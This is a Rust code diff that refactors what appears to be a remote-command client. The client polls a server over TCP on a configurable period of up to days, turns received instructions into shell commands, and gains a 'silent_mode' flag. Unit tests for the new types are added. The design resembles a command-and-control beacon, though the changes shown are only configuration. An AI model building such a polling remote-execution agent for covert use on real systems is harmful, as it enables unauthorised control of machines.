@@ -3,12 +3,13 @@ use std::net::TcpStream;
 use std::process::Command;
 use std::{io, thread, time};
 
-pub fn run(full_address: &str) {
-    let duration = time::Duration::from_secs(2);
+pub fn run(config: Config)  {
     loop {
-        thread::sleep(duration);
-        println!("Connecting to server at {}", full_address);
-        let stream = TcpStream::connect(full_address);
+        thread::sleep(config.request_period.to_duration());
+        let full_address = config.server.full_address();
+
+        println!("Connecting to server at {}", &full_address);
+        let stream = TcpStream::connect(&full_address);
 
         match stream {
             Ok(stream) => {
@@ -146,6 +147,64 @@ fn instruction_factory(instruction: &str) -> Box<dyn Executable> {
     }
 }
 
+pub enum TimeUnit {
+    Milliseconds,
+    Seconds,
+    Minutes,
+    Hours,
+    Days,
+}
+
+pub struct Period {
+    value: u64,
+    unit: TimeUnit,
+}
+
+impl Period {
+    pub fn new(value: u64, unit: TimeUnit) -> Self {
+        Period { value, unit }
+    }
+    fn to_duration(&self) -> time::Duration {
+        match self.unit {
+            TimeUnit::Milliseconds => time::Duration::from_millis(self.value),
+            TimeUnit::Seconds => time::Duration::from_secs(self.value),
+            TimeUnit::Minutes => time::Duration::from_secs(self.value * 60),
+            TimeUnit::Hours => time::Duration::from_secs(self.value * 60 * 60),
+            TimeUnit::Days => time::Duration::from_secs(self.value * 60 * 60 * 24),
+        }
+    }
+}
+
+pub struct ServerInfo {
+    address: String,
+    port: u16,
+}
+impl ServerInfo {
+    pub fn new(address: &str, port: u16) -> Self {
+        ServerInfo { address : address.to_string(), port }
+    }
+
+    fn full_address(&self) -> String {
+        format!("{}:{}", self.address, self.port)
+    }
+}
+
+pub struct Config {
+    server: ServerInfo,
+    request_period: Period,
+    silent_mode: bool,
+}
+
+impl Config {
+    pub fn new(server : ServerInfo, request_period : Period, silent_mode : bool) -> Self {
+        Config {
+            server,
+            request_period,
+            silent_mode,
+        }
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -207,4 +266,44 @@ mod tests {
         assert_eq!(result.get_program(), "ls");
         assert_eq!(args, &["-l", "-a"]);
     }
+
+    #[test]
+    fn test_period_to_duration_seconds() {
+        let period = Period::new(1, TimeUnit::Seconds);
+        let duration = period.to_duration();
+
+        assert_eq!(duration.as_secs(), 1);
+    }
+    #[test]
+    fn test_period_to_duration_minutes() {
+        let period = Period::new(1, TimeUnit::Minutes);
+        let duration = period.to_duration();
+
+        assert_eq!(duration.as_secs(), 60);
+    }
+
+    #[test]
+    fn test_period_to_duration_hours() {
+        let period = Period::new(1, TimeUnit::Hours);
+        let duration = period.to_duration();
+
+        assert_eq!(duration.as_secs(), 60 * 60);
+    }
+
+    #[test]
+    fn test_period_to_duration_days() {
+        let period = Period::new(1, TimeUnit::Days);
+        let duration = period.to_duration();
+
+        assert_eq!(duration.as_secs(), 60 * 60 * 24);
+    }
+
+    #[test]
+    fn test_server_info_full_address() {
+        let server = ServerInfo::new("127.0.0.1", 8080);
+        let full_address = server.full_address();
+
+        assert_eq!(full_address, "127.0.0.1:8080");
+    }
+
 }
